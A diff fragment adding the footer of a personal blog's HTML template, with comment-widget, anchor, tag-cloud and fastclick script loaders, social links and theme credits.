+           var j, e = d.getElementsByTagName(s)[0];
+    
+           if (typeof LivereTower === 'function') { return; }
+    
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+    
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    <!-- 来必力City版 公共JS代码 end -->
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                    <li>
+                        <a href="/atom.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/80imike">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/2093524665">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Mike 2018 | Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+                    <br>
+                    Theme by <a href="http://beantech.org">BeanTech</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://www.huweihuang.com">胡伟煌</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=huweihuang&repo=hexo-theme-huweihuang&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.hi-linux.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="https://www.hi-linux.com/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
